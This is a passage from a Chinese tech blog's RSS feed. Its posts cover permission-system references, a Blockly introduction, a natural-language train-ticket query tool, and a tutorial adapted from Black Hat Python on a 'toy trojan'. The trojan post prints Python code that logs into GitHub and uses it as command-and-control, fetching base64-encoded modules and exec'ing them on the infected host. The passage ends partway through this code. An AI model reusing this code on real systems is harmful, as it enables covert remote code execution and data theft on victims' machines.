&lt;/ul&gt;
&lt;h1 id="todo"&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LDAP  认证和权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_7"&gt;参考&lt;/h1&gt;
&lt;h3 id="_8"&gt;相关概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/item/RBAC"&gt;RBAC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-are-some-good-ways-to-design-permission-systems-in-software"&gt;What are some good ways to design permission systems in software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Role-based_access_control"&gt;Role-based access control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/xuhaipeng/article/details/4430446"&gt;角色权限系统的 一些概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/painsonline/article/details/7183613/"&gt;RBAC权限管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cncoders.net/article/10564/"&gt;权限系统---简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20313385"&gt;如何设计网站权限系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.security/rbac_use_auths.htm"&gt;RBAC 权限&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/333620/best-practice-for-designing-user-roles-and-permission-system/25643919#25643919"&gt;Best Practice for Designing User Roles and Permission System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E7%A7%81%E6%9C%89%E5%88%B6"&gt;私有制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%89%80%E6%9C%89%E6%9D%83"&gt;所有权&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="django_2"&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/topics/auth/default.html"&gt;使用Django认证系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikibooks.org/zh/Django/%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81"&gt;维基教科书 Django/用户认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="linux_1"&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://justcode.ikeepstudying.com/2016/08/linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"&gt;Linux: 系统文件权限总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/frand/archive/2011/01/03/1924987.html"&gt;掌握Linux的用户(组)，权限，文件精妙的三角关系&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 06 Sep 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-09-06:understand-permission.html</guid><category>code</category></item><item><title>blockly入门与介绍</title><link>/blockly-overview.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/blockly9c7fc7e6.png" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;是google发布的可视化编程工具，基于web技术构建。&lt;/p&gt;
&lt;p&gt;在功能/设计上和MIT的儿童编程语言&lt;a href="https://scratch.mit.edu/"&gt;Scratch&lt;/a&gt;类似&lt;/p&gt;
&lt;p&gt;使用blockly的时候，用户可以通过拖曳模块，来构建代码逻辑，过程很像搭积木&lt;/p&gt;
&lt;p&gt;在用户视角下，blockly是一个简单易用的可视化工具，用来生成代码。在开发者视角下，blockly是一个文本框，里边包含了用户输入好的代码。&lt;/p&gt;
&lt;p&gt;代码生成到文本框的过程，就是用户在blockly里拖曳的过程&lt;/p&gt;
&lt;p&gt;更多细节可以参考官方的&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;介绍&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_2"&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完全是JavaScript，可离线使用&lt;/li&gt;
&lt;li&gt;可生成6门语言：  &lt;ul&gt;
&lt;li&gt;JavaScript&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;PHP&lt;/li&gt;
&lt;li&gt;Dart&lt;/li&gt;
&lt;li&gt;Lua&lt;/li&gt;
&lt;li&gt;XML(XML有时也被视为语言，实际上它更像语法树)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持主流的浏览器，如：Chrome, Firefox, Safari, Opera, IE&lt;/li&gt;
&lt;li&gt;支持移动设备&lt;/li&gt;
&lt;li&gt;支持许多编程的基本元素，如：变量、函数、数组&lt;/li&gt;
&lt;li&gt;易于扩展自定义的块&lt;/li&gt;
&lt;li&gt;支持多国语言（40+）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_3"&gt;在线体验&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blockly-demo.appspot.com/static/demos/index.html"&gt;demo&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_4"&gt;文档&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developers.google.com/blockly/"&gt;文档&lt;/a&gt;：需要梯子&lt;/p&gt;
&lt;h1 id="_5"&gt;技术视角&lt;/h1&gt;
&lt;p&gt;在此我们以技术视角来审视blockly，而不怎么谈论它的教育意义&lt;/p&gt;
&lt;h3 id="blockly"&gt;作为编辑器的blockly&lt;/h3&gt;
&lt;p&gt;blockly将自己定位为一个编辑器&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The web-based visual programming editor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上边这句话是&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;源码库的自描述&lt;/p&gt;
&lt;p&gt;这个定位十分符合unix哲学：&lt;code&gt;Do one thing&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而且它确实是实诚的编辑器，而不是那种伪装成编辑器的操作系统（此处有火药味）&lt;/p&gt;
&lt;p&gt;blockly作为编辑器，它的输入为用户的拖曳（拖曳作为一种输入，可以类比为普通编辑器的键盘输入），输出为&lt;code&gt;生成的代码&lt;/code&gt;。使用blockly可以快速打造一个特定领域的可视化 块编程 编辑器&lt;/p&gt;
&lt;p&gt;至于每个积木（block）如何生成代码，代码用于什么用途，blockly则通通不关心，用户自己掌控。&lt;/p&gt;
&lt;p&gt;由于设计上遵循unix哲学，他也将获得unix哲学带来的好处，小而美带来的强大的组合能力。于是围绕blockly的生态十分广阔。涵盖硬件、软件，领域涵盖科研、教育、游戏、玩具等等&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/blocklyf7a63b9c.png" /&gt;&lt;/p&gt;
&lt;h3 id="_6"&gt;使用场景&lt;/h3&gt;
&lt;p&gt;随便列举几个典型的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以拖曳的方式生成代码，控制硬件&lt;/li&gt;
&lt;li&gt;作为软件的输入（demo中的拖曳出函数并生成图像）&lt;/li&gt;
&lt;li&gt;作为软件的的实时控制界面&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="blockly-app"&gt;构建一个Blockly app的步骤&lt;/h3&gt;
&lt;p&gt;按照官方文档&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;overview&lt;/a&gt;的说法，有以下三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成blockly编辑器&lt;/li&gt;
&lt;li&gt;定义你的app里的功能块（block）&lt;/li&gt;
&lt;li&gt;构建app的其余部分，blockly仅充当代码生成器，你需要决定这些用户生成的代码用于做什么，这也是你的app的核心功能所在&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="blockly_1"&gt;Blockly的强大之处&lt;/h3&gt;
&lt;p&gt;这部分翻译自&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Blockly作为一个可视化编程环境，正逐渐流行，那么你如何利用它呢，下边的优势举例可能对你有启发：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可导出的代码: 可以将基于block程序转化为基于普通文本的常规代码（多语言）&lt;/li&gt;
&lt;li&gt;开源： 可以以任何方式定制/使用它，甚至入侵修改它的内核&lt;/li&gt;
&lt;li&gt;可拓展： 通过添加定制化的&lt;code&gt;block关联到你的api上&lt;/code&gt; （将提供服务的部分视为下位机，对外提供api/指令集）&lt;/li&gt;
&lt;li&gt;生产可用：blockly不是一个玩具，你可以用它完成复杂的编程任务，例如写一个可以计算标准差的block&lt;/li&gt;
&lt;li&gt;国际化：blockly支持40多门语言&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_7"&gt;衍生项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blockly-games.appspot.com/"&gt;Blockly Game&lt;/a&gt;：拖曳式小游戏&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/developers"&gt;Scratch Blocks&lt;/a&gt;：该项目由Scratch团队使用blockly构建&lt;/li&gt;
&lt;li&gt;&lt;a href="http://appinventor.mit.edu/explore/"&gt;App Inventor&lt;/a&gt;：基于blockly的可视化安卓IDE&lt;/li&gt;
&lt;li&gt;&lt;a href="code.org"&gt;Code.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ozoblockly.com/"&gt;OzoBlockly&lt;/a&gt;：一个可编程微型机器人，编码烧录很有意思（屏幕闪烁）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.makewonder.com/"&gt;Wonder Workshop&lt;/a&gt;：可编程机器人玩具&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lab.open-roberta.org/"&gt;Open Roberta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scriptr.io/"&gt;scriptr.io&lt;/a&gt;：物联网云端IDE&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_8"&gt;脑洞&lt;/h1&gt;
&lt;p&gt;用做配置工具&lt;/p&gt;
&lt;p&gt;我们常遇到这种纠结：究竟要给用户怎样的配置界面，常规的UI界面，虽然友好，能做的事太少了。而基于文本的配置，表达能力是加强了，对用户不仅不友好，还容易因为拼写错误，出现奇怪问题（缺乏验证机制），让用户摸不着头脑&lt;/p&gt;
&lt;p&gt;基于blockly的配置工具，似乎是个很不错的选择，拥有编程语言级别的表达能力，操作起来又不晦涩。细节有空细说，下次有配置项丰富的项目，我决定试试blockly&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;---2018.4.17 更新---&lt;/p&gt;
&lt;h1 id="_9"&gt;教程&lt;/h1&gt;
&lt;p&gt;我前些时间为blockly写了一些入门开发教程，供大家参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-hello-world.html"&gt;blockly开发之hello world(0)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-run-code.html"&gt;blockly开发之生成并运行js代码(1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-python-browser-turtle.html"&gt;blockly开发之使用python驱动浏览器中的turtle(2)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你喜欢看代码，可以直接翻代码:&lt;a href="https://github.com/wwj718/blockly_dev"&gt;blockly_dev&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="_10"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;Introduction to Blockly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cooc-china.gitbooks.io/blockly/content/chapter1.html"&gt;Blockly是什么&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 02 Sep 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-09-02:blockly-overview.html</guid><category>code</category></item><item><title>为命令行火车票查询器添加自然语言交互界面</title><link>/iquery-nlp-interface.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/ibot13761852.png" /&gt;&lt;/p&gt;
&lt;p&gt;ps：采用&lt;a href="https://github.com/asciinema/asciinema"&gt;asciinema&lt;/a&gt;制作了&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;演示视频&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;&lt;img alt="asciicast" src="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;项目地址&lt;/h1&gt;
&lt;p&gt;先上项目源码:&lt;a href="https://github.com/wwj718/ibot"&gt;ibot&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="iquery"&gt;&lt;a href="https://github.com/protream/iquery"&gt;iquery&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;@sl前段时间跟我说，有个python写的命令行或者票查询器(iquery)很有趣，于是我玩了下，觉得挺好玩的，工具本身写得也干净利落。后来发现它只支持python3，还一度想让修改它使它兼容python2。&lt;/p&gt;
&lt;p&gt;此后有了新主意:为它加一个自然语言交互界面，这样被围观时，比较拉风&lt;/p&gt;
&lt;p&gt;当然啦，对于热爱CLI的小伙伴来说，CLI几乎是最佳的交互方式了，给它添加自然语言交互界面，未免画蛇添竹。我个人是偏好CLI的，不过觉得自然语言交互界面的好处之一是能然普通用户更自然地与机器对话，甚至采用语音与机器对话&lt;/p&gt;
&lt;h3 id="iquery_1"&gt;iquery的安装和使用&lt;/h3&gt;
&lt;p&gt;iquery作为命令行工具，写的是很棒的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 安装&lt;/span&gt;
pip3 install iquery
iquery 上海虹桥 北京 &lt;span class="m"&gt;802&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将获得本年8月2号从上海虹桥到北京的火车票信息:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/iquerye2d84a70.png" /&gt;&lt;/p&gt;
&lt;p&gt;当然你也可以指定火车的类型和输入完整的查询日期, 比如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;iquery -dg 上海 北京 20160802&lt;/code&gt;&lt;/p&gt;
&lt;h1 id="ibot"&gt;ibot&lt;/h1&gt;
&lt;p&gt;下边我们来看看如何使用ibot来查询火车票,&lt;a href=""&gt;ibot&lt;/a&gt;已经发布为python包，直接pip安装就行&lt;/p&gt;
&lt;p&gt;使用:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ibot 2016年8月十一号 南京到北京的车票
ibot 明天从南京到北京的车票
ibot 这周六从南京去北京出差，帮我看下车票
ibot 下周五离开南京去北京 查下车票
ibot 查一下上海去北京的车票，下周六
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/ibot13761852.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-08-01:iquery-nlp-interface.html</guid><category>dev-tools</category></item><item><title>用python和github构建一只玩具木马</title><link>/use-python-and-github-create-Trojan-Horse.html</link><description>&lt;p&gt;周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 --黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第七章很有意思，分享过来&lt;/p&gt;
&lt;p&gt;作者在这一章里说道&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most challenging aspects of creating a solid trojan framework is asynchronously controlling, updating, and receiving data from your deployed implants. It’s crucial to have a relatively universal way to push code to your remote trojans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写一个特洛伊木马的的挑战之一是异步地控制、更新和接收数据，并且能够通用的方法给你的木马们远程推送指令，而作者试图在这一章中给出一个漂亮的解决方案&lt;/p&gt;
&lt;h1 id="_1"&gt;木马&lt;/h1&gt;
&lt;p&gt;上边说的的木马是什么鬼&lt;/p&gt;
&lt;p&gt;据维基百科说 , "木马"这一名称来源于希腊神话特洛伊战争的特洛伊木马。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，看起来挺好的，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。&lt;/p&gt;
&lt;p&gt;经过一番追本溯源，计算机中这种被称为木马的程序有哪些特性，大家大体上应该有个印象了，如果不用隐喻，要描述出这类程序的特质，恐怕要多费许多口舌&lt;/p&gt;
&lt;p&gt;计算机科学的趣味之一是它的词汇异常丰富和生动，有大量的隐喻和类比&lt;/p&gt;
&lt;p&gt;《代码大全》在开篇的不久说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学领域中有着搜友学科中最为丰富多彩的语言。你走进一间安全严密，温度精确控制在20℃的房间，并在里面发现了病毒（virus），特洛伊木马（Trojan horse），蠕虫（worm），臭虫（bug），逻辑炸弹（bomb），崩溃（crash），论坛口水战（flame），双绞线转换头（twisted sex changer），还有致命错误（fatal error）……在其他领域中，你能遇到这些吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_2"&gt;正餐&lt;/h1&gt;
&lt;p&gt;在着一章中，作者主要演示了如何利用github作为控制和数据中心，构建灵活的木马，至于你要用木马来做什么，你可以发挥想象自己写插件到module里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;talk is cheap,show me your code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;代码不长，直接贴上(大家可以直接看&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;源码库&lt;/a&gt;)，值得说明的地方稍后讲解&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;imp&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;Queue&lt;/span&gt;
&lt;span class="c1"&gt;#import os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;

&lt;span class="n"&gt;trojan_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;trojan_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.json&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;data_path&lt;/span&gt;     &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;trojan_modules&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;task_queue&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;


&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./local.yaml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yaml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;find_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Attempting to retrieve &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;
            &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;modules/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_library&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;


        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__dict__&lt;/span&gt;

        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;



&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;gh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
